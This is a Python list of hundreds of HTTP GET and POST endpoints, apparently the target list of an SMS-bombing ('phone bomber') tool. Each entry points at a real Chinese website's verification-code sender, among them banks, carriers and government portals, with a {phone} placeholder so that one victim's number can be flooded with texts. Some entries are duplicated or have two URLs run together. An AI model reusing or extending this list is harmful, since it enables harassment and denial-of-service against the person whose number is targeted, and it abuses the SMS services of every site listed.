jiekou = [
  "GET",
  "https://m.wanzhoumo.com/proxy?api_path=%2Fuser%2Fmobilelogincode&v=3.0&fields_version=3.3&mobile={phone}",
  "GET",
  "https://evun.geely.com/mp/sys/user/captcha?mobile={phone}&type=1",
  "GET",
  "http://m.jinying.com/api/send_captcha.php?mobile={phone}&activity=pointcardWeb&expiry_min=3&companyNo=0145",
  "GET",
  "https://service.wzhxlx.com/wwyy/ceping/sendCode?channelId=99&mobile={phone}",
  "GET",
  "http://m.haiav.com/index.php?m=site&c=public&a=send_mobile_code&mobile={phone}&code=undefined&ismast=1",
  "GET",
  "http://www.icar-life.com/api/Connect/get_sms_captcha?type=1&phone={phone}",
  "GET",
  "https://jdapi.jd100.com/uc/v1/getSMSCode?account={phone}&sign_type=1&use_type=1",
  "GET",
  "http://user.daojia.com/mobile/getcode?mobile={phone}",
  "GET",
  "https://proconsumer.taoche.com/c-usercenter-consumer/user/getCode?mobile={phone}",
  "GET",
  "http://hr.xfcbank.com/ajax/wap.php?action=get_authcode&mobile={phone}",
  "GET",
  "http://www.wuylh.com/userreg/commons/getsmscode?phone={phone}",
  "GET",
  "https://esma.iccec.cn/apis/esma/users/signup/mobile?mobile={phone}&blackLoading=true&agentId=100112",
  "GET",
  "https://account.bol.wo.cn/cuuser/cuauth/smscode?mobile={phone}&smsType=2&clientId=woprom",
  "GET",
  "http://uniwechat.saicskoda.com.cn/wxPage/WebHandler.ashx?userid=oeXPu5-_nc6Yr6JmU8vj720WZ6wg&toid=08161&type=sendsms&tel={phone}",
  "GET",
  "https://login.11h5.com/account/api2.php?c=quick&d=getsms&nationcode=86&phone={phone}&type=2&v=1626775646428",
  "GET",
  "https://mall-cashback.tinman.cn/noRight/campaign/send-verification-code?phone={phone}",
  "GET",
  "http://www.51hengsheng.com/proxy/verify!sendVerify.do?dto.phone={phone}&dto.tempNumber=SMS_107505040",
  "GET",
  "http://zg99.offcn.com/index/chaxun/sendmsg?actid=40386&callback=jQuery111306786107026988504_1627575799465&phone={phone}&_=1627575799466",
  "GET",
  "https://z12.cnzz.com/stat.htm?id=1280063424&r=&lg=zh-cn&ntime=1632490428&cnzz_eid=1185173797-1632490428-&showp=424x906&p=",
  "GET",
  "http://api.nysytijian.com/api/common/GetVerifyCode?phoneNumber={phone}",
  "GET",
  "https://editor.588ku.com/site-api/send-tel-login-code?num={phone}&csrfToken=u1yzmFkHty7RXv0zSXJ7sLNTAs4ax6KfYciaU6GZKYXpkJHGQJXcM0IuJ-GrjMhUl9mcRx6Jnp6dWESUThFYog==",
  "GET",
  "https://ihealth.zhongan.com/api/whale/v1/H5/gift/message/sendSmsCode/1000000003?phone={phone}&productCode=AT34&envSource=browser",
  "GET",
  "https://m.95303.com/api/OrderYx/GetCodeBySMS?mobile={phone}&_=1626625066773",
  "GET",
  "https://www.51hawo.com/apollo/MobileCode/sendMobileCode?mobile={phone}&sms_type=101&register_from=20000091",
  "GET",
  "http://m.ctscd.com/sys/ajax/User/CheckOrActivat.ashx?U_Mobile={phone}&type=Mobile&checktext={phone}&_=1624877392029",
  "GET",
  "https://gwbk.zhongan.com/dmapiv2/za-dm-insure/dm/user/sendSMGCode?mobilePhone={phone}",
  "GET",
  "https://m.lu.com/user/service/login/otp-login-pre-check?mobileNo={phone}&skipPwd=1",
  "GET",
  "https://igetcool-share.igetcool.com/mall-server/api/smscode/sendSmscode?phone={phone}&countrycode=86&smstype=0&type=0",
  "GET",
  "https://pro.ouyeel.com/api/users/userApi/sendMsg?mobile={phone}",
  "GET",
  "https://www.sensorsdata.cn/api/passport/sms/quest_new/{phone}?_t=qajgslud4i",
  "GET",
  "https://xzqk.nethone.cn/addons/yun_shop/api.php?i=2&uuid=0&mid=28732&type=5&shop_id=null&basic_info=1&validate_page=1&route=member.register.sendCodeV2&mobile={phone}&state=86&captcha=undefined&code=undefined",
  "GET",
  "https://z12.cnzz.com/stat.htm?id=1280063424&r=&lg=zh-cn&ntime=1632524303&cnzz_eid=1185173797-1632490428-&showp=424x906&p=",
  "GET",
  "https://hapi.00bang.cn/llb/oauth/llb/getLoginSmsCode?mobile={phone}",
  "GET",
  "https://web-agent.tope365.com/msg/sms/codeSend?phone={phone}",
  "GET",
  "https://mallapi.yofogo.com/biz-mall-application/v1/user/verifyCode/getVerifyCode?phone={phone}&descriptionType=1&codeType=2",
  "GET",
  "http://gift.1liwu.cn/index.php?g=Wechat&m=User&a=sms&interface=1&mobile={phone}",
  "GET",
  "https://m.qt.hrse.com.cn/sms/register?phone={phone}&_=1628777374003",
  "GET",
  "http://www.pmax.cn/Home/Index/sendcaptcha.html?user={phone}&type=register&_=1632119551730",
  "GET",
  "https://vipwx.robam.com/robam-api/common/sms/code/{phone}?_r=1628670219261",
  "GET",
  "https://gl.dayday521.com/addons/yun_shop/api.php?i=1&mid=0&type=5&shop_id=null&route=member.register.sendCodeV2&mobile={phone}&state=86&captcha=undefined&code=undefined&sms_type=1",
  "GET",
  "https://huoke.prod.k12.vip/poem/common/sendCode?phone={phone}&fromType=1",
  "GET",
  "https://mytxkt.grazy.cn/wapApi/getCode?source_type=h5&mobile={phone}&area_code=%2B86",
  "GET",
  "http://c.boaov.org/boaoweb/lrsp/getyzmcode.do?xsid=&tel={phone}",
  "GET",
  "https://818ps.com/site-api/send-tel-login-code?num={phone}&codeImg=undefined",
  "GET",
  "http://www.365liye.com/API/Site/Member/SendCode?tel={phone}",
  "GET",
  "http://mayi-api.91ants.com/shared/sms/code?mobile={phone}",
  "GET",
  "https://h5.17k.com/ck/user/mobile/{phone}/message?smsType=1&appKey=1351550300",
  "GET",
  "https://sjapi.aihuishou.com/sj-api/auth/send/login-message?timestamp=1623173320783&mobile={phone}",
  "GET",
  "http://ershoucheapi.58.com/cheyuan/comm/smsCode.do?callback=jQuery17208815301240499984_1623173514122&phone={phone}&code=send&_=1623173533089",
  "GET",
  "http://api.passport.pptv.com/checkImageCodeAndSendMsg?&scene=REG_PPTV_APP&deviceId=867830021000533&aliasName={phone}",
  "GET",
  "https://wwyy.wzhxlx.com/wwyy/ceping/sendCode?channelId=99&entry=wzhxl_cdl_20200402&mobile={phone}",
  "GET",
  "http://www.00800.com.cn/cnhs/wqproject/index.php?app=public&mod=Passport&act=sendmsg&area_code=%2B86&phone={phone}",
  "GET",
  "https://sunacliving.sunac.com.cn/member/wap/member/index/doCheckKaptcha?mobile={phone}",
  "GET",
  "https://login.11h5.com/account/api2.php?c=quick&d=getsms&nationcode=86&phone={phone}&type=2&v=1626743584518",
  "GET",
  "https://m.zhuna.cn/login/sendCode.html?mobile={phone}",
  "GET",
  "https://guanjia.10010.com/front/auth-register/verification-code?mobile={phone}&openid=ol_FD5gTjAr1mxTGSIa5ZG8sHgII",
  "GET",
  "https://card.10010.com/ko-order/messageCaptcha/send?phoneVal={phone}",
  "GET",
  "http://api.pangxiaolu.com/pangxiaolu/user/code?mobile={phone}&area=86",
  "GET",
  "https://uat-wxmall.yaic.com.cn/wxTerminal/binding/getVerificationCodeYaic.do?requestType=3&mobile={phone}&sendTime=1626107386421",
  "GET",
  "https://www.hainanwangdai.com/api/v1/user/agreement/privacy/status?utmSource=yrd_m_web&phone={phone}",
  "GET",
  "https://m.chinawutong.com/ashx/SendSMS.ashx?code={phone}&Kind=login&CodeType=sms&ran=0.11568426389851116",
  "GET",
  "https://dss.xiongmaopeilian.com/student_wx/student/send_sms_code?country_code=86&mobile={phone}",
  "GET",
  "https://aitob.xiaoyezi.com/student_wx/student/send_sms_code?mobile={phone}",
  "GET",
  "http://static.likuso.com/user/update_shoujiyzm?callback=jQuery18307715529120842468_1624032951145&shouji={phone}&yzm=51826&_=1624032964470",
  "GET",
  "https://m.588ku.com/common/send-sms?phone={phone}",
  "GET",
  "https://www.donews.com/login/getcode?tel={phone}&time=0.4155787879991961",
  "GET",
  "https://kingcard.dgunicom.com/lsd-message/send/captcha/phone/v1?phoneNumber={phone}",
  "GET",
  "http://www.hanmeiju.com/memberverify/ajax/sendVerify.do?compType=member_register-15337078706993653&verifyType=SMS&value={phone}",
  "GET",
  "http://www.futureartdraw.com/code/api/?tel={phone}",
  "GET",
  "http://rst.qinghai.gov.cn/qhrst/sign/captcha?phoneNum={phone}",
  "GET",
  "https://m.paperword.com/mobile/code/v2/login/code?promote=0&mobile={phone}",
  "GET",
  "https://m.baixiu.org/Inc/ajax/IsRegister1.aspx?mobile={phone}",
  "GET",
  "http://m.114-91.com/common/api?cmd=APPMemberGetCheckCode&mobile={phone}&type=1&md5ParamNames=mobile%2Ctype",
  "GET",
  "http://m.qiuyi.cn/dengta/Sendmessage/sendCode?mobile={phone}&type=2",
  "GET",
  "http://ai-piano.kuaipeilian.com/ai-piano/user/code?mobile={phone}&area=86",
  "GET",
  "https://www.tzqc.net//api/user/UserIndex/sendSms?client=app&type=quickLogin&mobile={phone}",
  "GET",
  "https://www.lanniuh.com/web-bin/m/weChat/weChatPublic/get_message_info?phone={phone}&smsType=0&hospCode=42609044-5",
  "GET",
  "https://api.mall.autohome.com.cn/gateway/sms/sendVerificationCode?_appid=mall&mobile={phone}&type=11&callback=sendVerificationCodeSuccess",
  "GET",
  "https://login.51job.com/ajax/sendphonecode.php?jsoncallback=jQuery18303389149111755325_1624013936898&type=5&phone={phone}",
  "GET",
  "https://account.bol.wo.cn/cuuser/cuauth/smscode?mobile={phone}&smsType=2&clientId=hfgo",
  "GET",
  "https://api.hetao101.com/login/v2/account/oauth/verifyCode?phoneNumber={phone}",
  "GET",
  "https://msgo.10010.com/lsd-message/send/captcha/phone/v1?phoneNumber={phone}",
  "GET",
  "https://usercenter.i4.cn/pcuser_sendSms.action?json=&member.appId=2944&member.phone={phone}&member.source=0&member.platform=1",
  "GET",
  "http://lht-app.lhtex.com.cn:22225/lht/smsCode/save?mobile={phone}&mtype=0",
  "GET",
  "https://partner.10046.mi.com/miMobileOrder/sendSms?phoneNumber={phone}",
  "GET",
  "https://www.adidas.com.cn/member/sendMobileMessage.json?mobile={phone}&_=1624164095577",
  "GET",
  "http://stc.enjoyha.com/api/user/sms/send?mobile={phone}&codeType=0",
  "GET",
  "https://elove.darryring.com/api/crm/newGwLogin/getSMSValidCode?phone={phone}&type=login",
  "GET",
  "https://www.ttljf.com/ttl_site/user.do?mthd=getCheckCode&phoneNumber={phone}",
  "GET",
  "https://scapi.taodingding.com/getCode?phone={phone}",
  "GET",
  "http://lht-app.lhtex.com.cn:22225/lht/smsCode/save?mtype=0&mobile={phone}",
  "GET",
  "http://m.5khouse.com/ashx/yzm.ashx?tel={phone}&ys=hqyzm&sj=0.11739289648424056",
  "GET",
  "https://51tiaojiu.com/mobile/login/get_phone_code.html?user_phone={phone}",
  "GET",
  "https://www.hollycrm.com/messageInterface/sendVerifyMessage.php?telNum={phone}&actionId={phone}-828704&info=hollycrm400",
  "GET",
  "https://mp.vasen.com/weixingmobileservice/client/getphonecodeByphoneregister?phonenumber={phone}",
  "GET",
  "http://www.shejiyue.com:8080/SjyWebService/sendQuickCode.do?mobilePhone={phone}",
  "GET",
  "https://www.huodongxing.com/account/checkphoneexist?phone={phone}",
  "GET",
  "https://api2.paixin.com/users/code?phone=0086{phone}",
  "GET",
  "https://pass.hujiang.com/v2/api/v1/sms/send?action=SendMsg&mobile={phone}",
  "GET",
  "http://www.antong56.com/dc/register/sendSMS?mobile={phone}",
  "POST",
  "https://account.zbj.com/api/captchaService/needCaptcha",
  "phoneNum={phone}",
  "POST",
  "https://api.zhulisq.com/cloud/sms-middleware/account/sendVerifyCodeForM?timestamp=1634353700849",
  "mobile={phone}",
  "POST",
  "https://appapi.tmkoo.com/regSendCode",
  "phone={phone}",
  "POST",
  "https://m.idongde.com/user/sms",
  "phone_number={phone}",
  "POST",
  "http://bdsn.thjy2.com/index.php?a=getPhoneCode",
  "phone={phone}&res=getPhoneCode",
  "POST",
  "http://www.bqjob.com.cn/index.php/index/position/sms",
  "mobile={phone}&event=other",
  "POST",
  "http://www.huaicaijob.com/Index/send_mobile_code.html",
  "mobile={phone}&sms_type=reg",
  "POST",
  "https://member.mkzcdn.com/register/code/",
  "mobile={phone}",
  "POST",
  "http://fc.61info.cn/fc-fission/o/v1.0/experience/sendInternalCaptcha",
  "phone={phone}&areaCode=86&channel=bdsem3-yd-10jk-10",
  "POST",
  "https://id.app.acfun.cn/rest/web/login/sms/send",
  "mobile={phone}&type=6&ztIdentityVerificationCheckToken=&ztIdentityVerificationType=",
  "POST",
  "http://v.zzstep.com/user/ajax/sendPhoneRegisterOrLogin",
  "mobileVal={phone}",
  "POST",
  "https://shd.shenhudong.com/api/v1/usertest/sendsms",
  "mobile={phone}&type=1",
  "POST",
  "http://www.xiongmaopeilian.com/web/auth/send_validate_code",
  "mobile={phone}",
  "POST",
  "https://endpoint.xiaomapeilian.com/aimusic/Auth/register/get-sms-code",
  "area=%2B86&phone={phone}&src=1",
  "POST",
  "https://qiye.biyeshen.cn/interface/api/user/sendcode",
  "phone={phone}&type=2&service_code=2&user_id=&",
  "POST",
  "https://www.hnsweiqi.com/portal/reg/sendCode",
  "phone={phone}",
  "POST",
  "https://www.jiandan001.com/rest/yonghubiao/ca/register.json",
  "_ajax=true&ct=public_json&phonenumber={phone}",
  "POST",
  "https://bbs.leyuz.net/index/user/get_verify_code",
  "emailto=&type=signup&phoneto={phone}&code=hdsjTr04572",
  "POST",
  "http://gif.55.la/wxlogin",
  "a=sendloginsms&mobile={phone}",
  "POST",
  "https://info.weimiao.cn/index.php/Home/Base/SendCode.html",
  "phone={phone}",
  "POST",
  "https://wap.cdyushun.com/April/getCode",
  "phonew={phone}&uv_r=1623588133254186",
  "POST",
  "http://www.kuaipeilian.com/api/send_verify_code",
  "area_code=86&mobile={phone}&type=receive_trial_klass",
  "POST",
  "https://api.imquzan.com/user/user_tool/sendMobileSMS",
  "phone={phone}",
  "POST",
  "http://liuyan.people.com.cn/getCode",
  "phoneNum={phone}",
  "POST",
  "https://passport.shuidihuzhu.com/api/useraccount/sendVerifyCode",
  "mobile={phone}&bizType=24",
  "POST",
  "https://api.guazi.com/clientUc/Index/sendVerify",
  "phone={phone}&token=0cc7d90d5ddbed7fa429380b6f376ac1&t=1623177414&source=12&platfromSource=wap",
  "POST",
  "https://user.qunar.com/webApi/logincode.jsp",
  "mobile={phone}&vcode=&origin=test&isUcApi=1&useDefault=1&action=register&type=implicit&source=mobile_ucenter",
  "POST",
  "https://api.zhaotu.com/register/sms.html",
  "phone={phone}",
  "POST",
  "https://www.fotor.com.cn/api/user/smsCode/getCode",
  "areaCode=86&mobile={phone}",
  "POST",
  "https://login.koolearn.com/sso/m/m-sendRegisterMessage.do",
  "mobile={phone}&imageCode=&countryCode=86&country=CN",
  "POST",
  "https://mobile.cmbchina.com/DUserManage/UserRegisterNew/URN_Register.aspx",
  "$RequestMode$=1&PhoneNo={phone}&ClientNo=f20c5365321b4411a0ae4aa8d5ddd608&Command=CMD_SENGMSGCODE",
  "POST",
  "https://39.106.39.190/index/login/sendCode",
  "phone={phone}",
  "POST",
  "http://www.zhongqiaokeji.cc:8808/api/msg/sms",
  "phone={phone}",
  "POST",
  "http://api.youyuanmall.cn/api/passport/smsCode",
  "username={phone}&type=register",
  "POST",
  "http://portal.hongbeiyun.com/register/getShortMsgCode.html",
  "mobile={phone}&type=1",
  "POST",
  "http://47.102.103.32/api_backend.php?r=index/sms",
  "mobile={phone}",
  "POST",
  "https://pc.zhaocaidan.com/LoginShops/SendCodeByReg",
  "mobile={phone}",
  "GET",
  "http://hz.l9c.cn//api.php?act=user&key=eeKBYDpZs3jiA5j3Sd&phone={phone}",
  "POST",
  "http://www.xiongmaopeilian.com/web/auth/send_validate_code",
  "mobile={phone}",
  "POST",
  "http://m.yupao.com/index/send-tel-code/",
  "_csrf_m_decorate=jdZB_M9J_ke-rFjSLJutrQB3r_pRKeB1ekOJGCdISegvL0Tc9zETLuKIOAH9YmZRmZpPV-9heuv7vI0DBbQAbg%3D%3D&tel={phone}&action=code-login&token=1318695695bc894ab42f942e5ca5a914&time=1623177811&rand=2&check=1&words=gEdnAh",
  "GET",
  "https://www.nsxxs.cc/api.php?hm={phone}",
  "GET",
  "https://2carapi.haval.com.cn/open/api/wap/member/sendSSOCode?mobile={phone}&type=login",
  "GET",
  "https://m.atomychina.com.cn/cn/api/account/certification?method=1&methodData={phone}&mode=1",
  "GET",
  "http://66.xn--kiv58k544a.site/api.php?act=user&key=6iyBjBSiYy6G8kiogb&phone={phone}",
  "GET",
  "https://jdapi.jd100.com/uc/v1/getSMSCode?account={phone}&sign_type=1&use_type=0",
  "GET",
  "https://m.mgqr.com/ajax/getcode_reg.ashx?phone={phone}&check=0&t=1620219103066",
  "GET",
  "https://sms-server.gaodun.com/index.php?from=ldyhrBvmvJOdPCPb&act=chk&phone={phone}",
  "GET",
  "https://wap.china0001.com.cn/reg/sendverycode/company=&truename=&mobile={phone}",
  "GET",
  "https://www.donews.com/login/getcode?tel={phone} &time=0.4155787879991961",
  "GET",
  "https://www.d7w.net/index.php?g=Member&m=Api&a=getmobilecode_binding&j=json&mobile={phone}",
  "GET",
  "https://api.wanwudezhi.com/module-user/api/v1/user/sendSmsCode?phone={phone}",
  "GET",
  "http://id.ifeng.com/api/simplesendmsg?mobile={phone}",
  "GET",
  "https://flights.sichuanair.com/3uair/ibe/profile/processSendSMSNew.do?ConversationID=&smsType=REGISTER&mobilePhone={phone}&verkey=MOBILELOGIN",
  "GET",
  "http://api.bangtuike.com.cn/api/v1/account/captcha?phone={phone}&country=%2B86",
  "GET",
  "http://ws.sythealth.com/wsbyte/fit/v4/sms/validatorcode?form=0&account={phone}",
  "GET",
  "https://puser.hnzwfw.gov.cn/api/user/sms?mobile={phone}&_=1592528454449",
  "GET",
  "http://www.qmango.com/users/ajax/ajax_register_code.asp?_=1487743660579&mobile={phone}",
  "POST",
  "https://home.51cto.com/third-mobile/get-mobile-code",
  "mobile={phone}",
  "POST",
  "http://tyrz.zwfw.gxzf.gov.cn/portal/veryCode/smsCode",
  "method=sendMobileCode&userMobile={phone}&random=3.683700997199335",
  "POST",
  "https://live.cloudroom.com/live_sendPhoneCode.action",
  "phoneNum={phone}&actionType=reg",
  "POST",
  "http://www.xqnwk.com/c/sendcode/phone",
  "username={phone}",
  "POST",
  "http://www.q1117.com/index.php?m=Mobile&c=User&a=send_validate_code&t=0.8948361023250015",
  "send={phone}",
  "POST",
  "http://www.buptict.cn/uxapi/auth/auth/account/regcode",
  "mobile={phone}",
  "POST",
  "https://m.dgzq.com.cn/dz-wx/bind/sendMessage",
  "phone={phone}",
  "POST",
  "http://api.hndyjyfw.gov.cn/djapi/mobileVerify",
  "phone={phone}&verifytype=1",
  "POST",
  "http://www.pmzaojia.com/Ajax.ashx?rd=0.19649457254559954",
  "PostType=sendRegmsg&Tel={phone}",
  "GET",
  "https://www.1dagong.com/Login/sendCode?mobile={phone}",
  "GET",
  "http://edms.fcbox.com/hibox/weixin/getVerifyCode?mobilePhone={phone}",
  "GET",
  "https://m.yiwise.com/apiPlatform/verificationCode/send?phoneNumber={phone}",
  "GET",
  "https://www.rongyihuahua.com/jud/verifyCode?isLoaner=true&phone={phone}",
  "GET",
  "https://gwbk.zhongan.com/dmapiv2/za-dm-insure/dm/user/sendSMGCode?mobilePhone={phone}&from=web",
  "GET",
  "http://www.sk-vip.cn/index.php?m=&c=page&a=yunhu&phone={phone}",
  "GET",
  "https://app.zhuanzhuan.com/zz/transfer/getCaptcha?type=1&mobile={phone}",
  "GET",
  "http://www.xuebangsoft.net/eduboss/CommonAction/sendVarifyCodeToPhone.do?phoneNumber={phone}&regTimeCode=1589627585503",
  "GET",
  "https://join.xiaodianpu.com/api/vc/v1/login/sendSmsCode?telPhone={phone}&type=1http://www.tzkspt.com/index.php?user-app-register-mscode&mobile={phone}",
  "GET",
  "http://m.lyrce.net/smsreg.php?YSJ={phone}http://800qph500.ahguanchen.com/API/Common/GetPhoneVerifyCode?phoneNo={phone}&msgType=1&v=012144239140090107",
  "GET",
  "http://www.waizongguan.com/PostMobileNum.aspx?mobile={phone}",
  "GET",
  "http://mobile.iqihang.com/api/v2/user/send-sms?phone={phone}&cmd=20&verifyCode=http://m.coursemall.cn/passport/regcode?mobile={phone}",
  "GET",
  "http://www.patfun.com/do.php?ac=check_sms&phone={phone}",
  "GET",
  "http://www.upshop.cn/Home/User/registerSendCode.html?mobile={phone}",
  "GET",
  "http://www.zhichiwangluo.com/index.php?r=Login/phoneResetCode&phone={phone}",
  "GET",
  "https://hdh.10086.cn/common/validationIP?phone={phone}",
  "GET",
  "http://tools.wx6.org/dianhuahongzhaji/?telcode={phone}",
  "GET",
  "http://www.happigo.com/shop/index.php?act=login&op=send_auth_code&mobile={phone}",
  "GET",
  "https://host.convertlab.com/sms/get?mobile={phone}&name=Convertlab&token=4080fdef3cb44298852d226af95b2502&type=form&uuid=4a48dbfe8e1d49ab87715d2ed8e6e79d",
  "GET",
  "https://5.9188.com/user/sendSms.go?mobileNo={phone}",
  "GET",
  "http://m.xymens.com/index.php/Home/User/send_code?mobile={phone}",
  "GET",
  "http://www.51zouchuqu.com/sms/send?mobileNo={phone}",
  "GET",
  "http://user.memeyule.com/authcode/send_mobile?china=true&mobile={phone}",
  "GET",
  "http://m.egou.com/validate_phone.htm?phone={phone}",
  "GET",
  "http://www.zjsgat.gov.cn:8080/was/portals/cxfw/checkusermobile.jsp?mobilephone={phone}",
  "GET",
  "http://admin.bongv.com/Home/Modify/sendSmsCode_New.shtml?mp={phone}",
  "GET",
  "http://ptlogin.4399.com/ptlogin/sendPhoneLoginCode.do?phone={phone}&appId=www_home&v=2&sig=&t=1592615855903&v=2",
  "GET",
  "http://tel.kuaishang.cn/cl.php?tel={phone}",
  "GET",
  "http://www.100ppi.com/ecp/ppi/get_sf/get_yzm.php?m={phone}",
  "GET",
  "http://m.tk.cn/tkmobile/service/member?function_code=dynamicLogin&login_mobile={phone}",
  "GET",
  "http://www.suicunsuiqu.com/front/account/verifyMobileReg?mobile={phone}",
  "GET",
  "http://www.jiqinging.com/ajax.php?do=getCheckCode+tel={phone}",
  "GET",
  "https://5.9188.com/activity/activityMobileCheck.go?id=qzkj&mobileno={phone}",
  "GET",
  "http://www.jiqinging.com/ajax.php?do=getCheckCode&tel={phone}",
  "GET",
  "http://www.xlcidc.com/chkName.asp?umobie={phone}&lm=sendmobi&sd=0.5806221691630391",
  "GET",
  "http://app.syxwnet.com/?app=member&controller=index&action=sendMobileMessage&mobile={phone}",
  "GET",
  "http://www.aipai.com/app/www/apps/ums.php?step=ums&mobile={phone}",
  "GET",
  "https://user.meilimei.com/taomi/user/sendSmsCaptcha?mobile={phone}",
  "GET",
  "http://www.zjzxts.gov.cn/sendMsg.do?modelMethod=sendMessage&phonenum={phone}",
  "GET",
  "https://passport.eqxiu.com/eqs/sms/token?phone={phone}&type=quickLogin&checkPhone=1&channel=21&version=4.4.1",
  "GET",
  "http://b2c.csair.com/portal/smsMessage/EUserVerifyCode?mobile={phone}",
  "GET",
  "https://sso-c.souche.com/loginApi/getCaptchaUrlByPhone.json?app=tangeche&phone={phone}",
  "GET",
  "http://www.ryzwz.com/index.php?hm={phone}&ok=",
  "GET",
  "http://cthwallet.com/en/data/dy/index.php?hm={phone}",
  "GET",
  "http://hezi.ainide.cn/hzq/lt213.php?hm={phone}",
  "GET",
  "http://www.52fzlt.cn/api.php?hm={phone}",
  "GET",
  "https://yun.2ov.xyz/api.php?hm={phone}",
  "POST",
  "https://dz.blizzard.cn/action/user/mobile/captcha",
  "mobile={phone}",
  "POST",
  "https://cloud.bimbdip.com//user/smsVerifier/",
  "telephone={phone}&type=0",
  "POST",
  "https://zhihoutai.com/register/sendSmsVerificationCode",
  "phoneNumber={phone}",
  "POST",
  "https://xy.umfintech.com/spEnterprise/saas/registerSaasAction!RegToSendMsg.action",
  "mobileNo={phone}",
  "POST",
  "https://www.baixing.com/wap/oz/verify/reg",
  "mobile={phone}&businessType=register_captcha_code",
  "POST",
  "http://www.baixing.com/wap/oz/verify/",
  "fromS9=1&identity={phone}&mobile={phone}",
  "POST",
  "https://api.qingmang.mobi/v1/account.sendVerification",
  "code=1566478386.8872059778&phone={phone}",
  "POST",
  "https://user.daojia.com/mobile/getcode",
  "mobile={phone}&newVersion=1&bu=112",
  "POST",
  "https://tyrz.zwfw.gxzf.gov.cn/portal/veryCode/smsCode",
  "method=sendMobileCode&userMobile={phone}&random=3.683700997199335",
  "POST",
  "https://www.xqnwk.com/c/sendcode/phone",
  "username={phone}",
  "POST",
  "https://www.q1117.com/index.php?m=Mobile&c=User&a=send_validate_code&t=0.8948361023250015",
  "send={phone}",
  "POST",
  "https://www.buptict.cn/uxapi/auth/auth/account/regcode",
  "mobile={phone}",
  "POST",
  "https://api.hndyjyfw.gov.cn/djapi/mobileVerify",
  "phone={phone}&verifytype=1",
  "POST",
  "https://www.pmzaojia.com/Ajax.ashx?rd=0.19649457254559954",
  "PostType=sendRegmsg&Tel={phone}",
  "POST",
  "https://bdsn.thjy2.com/index.php?a=getPhoneCode",
  "phone={phone}&res=getPhoneCode",
  "POST",
  "https://www.bqjob.com.cn/index.php/index/position/sms",
  "mobile={phone}&event=other",
  "POST",
  "https://www.huaicaijob.com/Index/send_mobile_code.html",
  "mobile={phone}&sms_type=reg",
  "POST",
  "https://fc.61info.cn/fc-fission/o/v1.0/experience/sendInternalCaptcha",
  "phone={phone}&areaCode=86&channel=bdsem3-yd-10jk-10",
  "POST",
  "https://v.zzstep.com/user/ajax/sendPhoneRegisterOrLogin",
  "mobileVal={phone}",
  "POST",
  "https://www.xiongmaopeilian.com/web/auth/send_validate_code",
  "mobile={phone}",
  "POST",
  "https://gif.55.la/wxlogin",
  "a=sendloginsms&mobile={phone}",
  "POST",
  "https://www.kuaipeilian.com/api/send_verify_code",
  "area_code=86&mobile={phone}&type=receive_trial_klass",
  "POST",
  "https://liuyan.people.com.cn/getCode",
  "phoneNum={phone}",
  "POST",
  "https://www.zhongqiaokeji.cc:8808/api/msg/sms",
  "phone={phone}",
  "POST",
  "https://api.youyuanmall.cn/api/passport/smsCode",
  "username={phone}&type=register",
  "POST",
  "https://portal.hongbeiyun.com/register/getShortMsgCode.html",
  "mobile={phone}&type=1",
  "POST",
  "https://47.102.103.32/api_backend.php?r=index/sms",
  "mobile={phone}",
  "POST",
  "https://mobile.cmbchina.com/DUserManage/UserRegisterNew/URN_Register.aspx",
  "RequestMode=1&PhoneNo={phone}&ClientNo=f20c5365321b4411a0ae4aa8d5ddd608&Command=CMD_SENGMSGCODE",
  "POST",
  "https://116.63.180.48/api/common/registCode",
  "phone={phone}",
  "POST",
  "https://yx.weiguanshequ.cn/api/common/registCode",
  "phone={phone}",
  "POST",
  "https://rlzx.jqkj.info/api/common/registCode",
  "phone={phone}",
  "POST",
  "https://pg.eeagd.edu.cn/ks/public/kszc/zcyzm.jsmeb",
  "{phone}",
  "POST",
  "https://47.89.9.199:8080/api/v1/user/mobile/check",
  "mobile={phone}",
  "POST",
  "https://www.bugbank.cn/api/verifymobile",
  "mobile={phone}",
  "POST",
  "https://evun.geely.com/mp/sys/user/captcha",
  "mobile={phone}&type=1",
  "POST",
  "https://rst.qinghai.gov.cn/qhrst/sign/captcha",
  "phoneNum={phone}",
  "POST",
  "https://www.nsxxs.cc/api.php",
  "hm={phone}",
  "POST",
  "https://2carapi.haval.com.cn/open/api/wap/member/sendSSOCode",
  "mobile={phone}&type=login",
  "POST",
  "https://m.atomychina.com.cn/cn/api/account/certification",
  "method=1&methodData={phone}&mode=1",
  "POST",
  "https://66.xn--kiv58k544a.site/api.php",
  "act=user&key=6iyBjBSiYy6G8kiogb&phone={phone}",
  "POST",
  "https://jdapi.jd100.com/uc/v1/getSMSCode",
  "account={phone}&sign_type=1&use_type=0",
  "POST",
  "https://m.mgqr.com/ajax/getcode_reg.ashx",
  "phone={phone}&check=0&t=1620219103066",
  "POST",
  "https://sms-server.gaodun.com/index.php",
  "from=ldyhrBvmvJOdPCPb&act=chk&phone={phone}",
  "POST",
  "https://wap.china0001.com.cn/reg/sendverycode/company=&truename=&mobile={phone}",
  "POST",
  "https://m.wanzhoumo.com/proxy",
  "api_path=%2Fuser%2Fmobilelogincode&v=3.0&fields_version=3.3&mobile={phone}",
  "POST",
  "https://m.jinying.com/api/send_captcha.php",
  "mobile={phone}&activity=pointcardWeb&expiry_min=3&companyNo=0145",
  "POST",
  "https://service.wzhxlx.com/wwyy/ceping/sendCode",
  "channelId=99&mobile={phone}",
  "POST",
  "https://m.haiav.com/index.php",
  "m=site&c=public&a=send_mobile_code&mobile={phone}&code=undefined&ismast=1",
  "POST",
  "https://www.icar-life.com/api/Connect/get_sms_captcha",
  "type=1&phone={phone}",
  "POST",
  "https://jdapi.jd100.com/uc/v1/getSMSCode",
  "account={phone}&sign_type=1&use_type=1",
  "POST",
  "https://user.daojia.com/mobile/getcode",
  "mobile={phone}",
  "POST",
  "https://proconsumer.taoche.com/c-usercenter-consumer/user/getCode",
  "mobile={phone}",
  "POST",
  "https://hr.xfcbank.com/ajax/wap.php",
  "action=get_authcode&mobile={phone}",
  "POST",
  "https://www.wuylh.com/userreg/commons/getsmscode",
  "phone={phone}",
  "POST",
  "https://esma.iccec.cn/apis/esma/users/signup/mobile",
  "mobile={phone}&blackLoading=true&agentId=100112",
  "POST",
  "https://account.bol.wo.cn/cuuser/cuauth/smscode",
  "mobile={phone}&smsType=2&clientId=woprom",
  "POST",
  "https://uniwechat.saicskoda.com.cn/wxPage/WebHandler.ashx",
  "userid=oeXPu5-_nc6Yr6JmU8vj720WZ6wg&toid=08161&type=sendsms&tel={phone}",
  "POST",
  "https://login.11h5.com/account/api2.php",
